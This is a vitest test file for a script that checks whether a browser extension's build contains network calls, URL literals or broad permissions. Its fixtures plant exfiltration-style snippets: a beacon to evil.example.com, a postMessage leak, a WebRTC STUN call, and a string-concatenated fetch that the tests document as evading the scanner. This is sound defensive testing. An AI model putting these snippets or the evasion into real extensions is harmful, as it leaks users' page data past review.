// Falsification: writes a throwaway dist with a fetch( call and
// confirms `node scripts/check-no-network.mjs <dir>` exits non-zero; also
// confirms a clean throwaway dist exits zero, and that the six site
// hostnames in the manifest's content_scripts.matches do not themselves
// trigger the "unexplained URL literal" check.
//
// FALSIFIED 2026-09-07: first attempt used `fetch("https://example.com")`
// as the planted line -- emptying FORBIDDEN_NETWORK_TOKENS in
// scripts/check-no-network.mjs still left that test passing (still
// non-zero exit), because the separate "unexplained URL literal" check
// caught the literal string anyway and masked the broken token list. That
// is exactly the false confidence this check exists to catch. Fixed the test to
// plant `fetch(location.href)` instead (no URL literal, isolating the
// FORBIDDEN_NETWORK_TOKENS check), added a second test for the URL-literal
// check on its own, and re-broke FORBIDDEN_NETWORK_TOKENS to []: the
// "FALSIFIED: exits non-zero when a built file contains fetch(" test then
// failed for real with "expected +0 not to be +0" (exit code 0). Restored
// the token list.
import { describe, expect, it } from "vitest";
import { mkdtempSync, writeFileSync, rmSync, existsSync } from "node:fs";
import { tmpdir } from "node:os";
import path from "node:path";
import { execFileSync } from "node:child_process";

const ROOT = path.resolve(__dirname, "../..");
const SCRIPT = path.join(ROOT, "scripts/check-no-network.mjs");

function runScript(dir: string): { status: number; stdout: string; stderr: string } {
  try {
    const stdout = execFileSync("node", [SCRIPT, dir], { encoding: "utf8" });
    return { status: 0, stdout, stderr: "" };
  } catch (err) {
    const e = err as { status: number; stdout: string; stderr: string };
    return { status: e.status, stdout: e.stdout, stderr: e.stderr };
  }
}

function writeCleanManifest(dir: string): void {
  writeFileSync(
    path.join(dir, "manifest.json"),
    JSON.stringify({
      manifest_version: 3,
      name: "test",
      version: "0.0.0",
      permissions: ["storage"],
      host_permissions: [],
      content_scripts: [{ matches: ["https://chatgpt.com/*"], js: ["content.js"] }],
    })
  );
}

describe("check-no-network.mjs", () => {
  it("exits zero on a clean throwaway dist", () => {
    const dir = mkdtempSync(path.join(tmpdir(), "pg-net-clean-"));
    try {
      writeCleanManifest(dir);
      writeFileSync(path.join(dir, "content.js"), "console.log;\nconst x = 1 + 1;\n");
      const result = runScript(dir);
      expect(result.status).toBe(0);
    } finally {
      rmSync(dir, { recursive: true, force: true });
    }
  });

  it("FALSIFIED: exits non-zero when a built file contains fetch(", () => {
    const dir = mkdtempSync(path.join(tmpdir(), "pg-net-fetch-"));
    try {
      writeCleanManifest(dir);
      // No URL string literal here on purpose -- this isolates the
      // FORBIDDEN_NETWORK_TOKENS ("fetch(") check from the separate
      // "unexplained URL literal" check below, which a first version of
      // this test conflated (see the FALSIFIED note above the imports).
      writeFileSync(path.join(dir, "content.js"), "fetch(location.href);");
      const result = runScript(dir);
      expect(result.status).not.toBe(0);
    } finally {
      rmSync(dir, { recursive: true, force: true });
    }
  });

  it("exits non-zero when an unexplained URL literal appears, even with no forbidden token", () => {
    const dir = mkdtempSync(path.join(tmpdir(), "pg-net-urlliteral-"));
    try {
      writeCleanManifest(dir);
      writeFileSync(
        path.join(dir, "content.js"),
        'const beacon = "https://evil.example.com/collect";'
      );
      const result = runScript(dir);
      expect(result.status).not.toBe(0);
    } finally {
      rmSync(dir, { recursive: true, force: true });
    }
  });

  it("FALSIFIED (Attack B): exits non-zero on window.postMessage(", () => {
    const dir = mkdtempSync(path.join(tmpdir(), "pg-net-postmsg-"));
    try {
      writeCleanManifest(dir);
      writeFileSync(
        path.join(dir, "content.js"),
        'window.postMessage({kind:"pg-probe",data:text},"*");'
      );
      const result = runScript(dir);
      expect(result.status).not.toBe(0);
    } finally {
      rmSync(dir, { recursive: true, force: true });
    }
  });

  it("exits non-zero on RTCPeerConnection / a stun: URL", () => {
    const dir = mkdtempSync(path.join(tmpdir(), "pg-net-webrtc-"));
    try {
      writeCleanManifest(dir);
      writeFileSync(
        path.join(dir, "content.js"),
        'new RTCPeerConnection({iceServers:[{urls:"stun:stun.example.com"}]});'
      );
      const result = runScript(dir);
      expect(result.status).not.toBe(0);
    } finally {
      rmSync(dir, { recursive: true, force: true });
    }
  });

  it("KNOWN GAP (Attack A): a fragmented computed-property fetch is NOT caught -- documents the limit named in scripts/check-no-network.mjs", () => {
    const dir = mkdtempSync(path.join(tmpdir(), "pg-net-fragmented-"));
    try {
      writeCleanManifest(dir);
      writeFileSync(
        path.join(dir, "content.js"),
        'var fnName = "f" + "e" + "t" + "c" + "h"; window[fnName]("https://" + "evil.example" + "/c");'
      );
      const result = runScript(dir);
      // This documents today's real, named gap: a literal-token/string grep
      // cannot see a computed-property, string-concatenated call. Closing
      // it needs an AST walk (see the ponytail comment in the script).
      expect(result.status).toBe(0);
    } finally {
      rmSync(dir, { recursive: true, force: true });
    }
  });

  it("exits non-zero when console.log( appears in the bundle", () => {
    const dir = mkdtempSync(path.join(tmpdir(), "pg-net-console-"));
    try {
      writeCleanManifest(dir);
      writeFileSync(path.join(dir, "content.js"), 'console.log("hi");');
      const result = runScript(dir);
      expect(result.status).not.toBe(0);
    } finally {
      rmSync(dir, { recursive: true, force: true });
    }
  });

  it("exits non-zero when host_permissions is non-empty", () => {
    const dir = mkdtempSync(path.join(tmpdir(), "pg-net-hostperm-"));
    try {
      writeFileSync(
        path.join(dir, "manifest.json"),
        JSON.stringify({
          manifest_version: 3,
          permissions: ["storage", "activeTab"],
          host_permissions: ["https://example.com/*"],
          content_scripts: [],
        })
      );
      writeFileSync(path.join(dir, "content.js"), "const x = 1;");
      const result = runScript(dir);
      expect(result.status).not.toBe(0);
    } finally {
      rmSync(dir, { recursive: true, force: true });
    }
  });

  it("exits non-zero when permissions includes tabs", () => {
    const dir = mkdtempSync(path.join(tmpdir(), "pg-net-tabs-"));
    try {
      writeFileSync(
        path.join(dir, "manifest.json"),
        JSON.stringify({
          manifest_version: 3,
          permissions: ["storage", "activeTab", "tabs"],
          host_permissions: [],
          content_scripts: [],
        })
      );
      writeFileSync(path.join(dir, "content.js"), "const x = 1;");
      const result = runScript(dir);
      expect(result.status).not.toBe(0);
    } finally {
      rmSync(dir, { recursive: true, force: true });
    }
  });

  it("exits non-zero when permissions includes activeTab (the allow list must match what the manifests actually declare, not what they used to)", () => {
    const dir = mkdtempSync(path.join(tmpdir(), "pg-net-activetab-"));
    try {
      writeFileSync(
        path.join(dir, "manifest.json"),
        JSON.stringify({
          manifest_version: 3,
          permissions: ["storage", "activeTab"],
          host_permissions: [],
          content_scripts: [],
        })
      );
      writeFileSync(path.join(dir, "content.js"), "const x = 1;");
      const result = runScript(dir);
      expect(result.status).not.toBe(0);
    } finally {
      rmSync(dir, { recursive: true, force: true });
    }
  });

  it("allows the manifest's own content_scripts match URLs", () => {
    const dir = mkdtempSync(path.join(tmpdir(), "pg-net-matches-"));
    try {
      writeCleanManifest(dir);
      writeFileSync(path.join(dir, "content.js"), "const x = 1;");
      const result = runScript(dir);
      expect(result.status).toBe(0);
    } finally {
      rmSync(dir, { recursive: true, force: true });
    }
  });

  it("the real built dist/ passes (package.json's test script runs build first)", () => {
    const distDir = path.join(ROOT, "dist");
    if (!existsSync(distDir)) {
      // vitest run alone (not via `npm test`) may not have built yet.
      execFileSync("node", [path.join(ROOT, "scripts/build.mjs")], { cwd: ROOT });
    }
    const result = runScript(distDir);
    expect(result.status, result.stdout + result.stderr).toBe(0);
  });
});
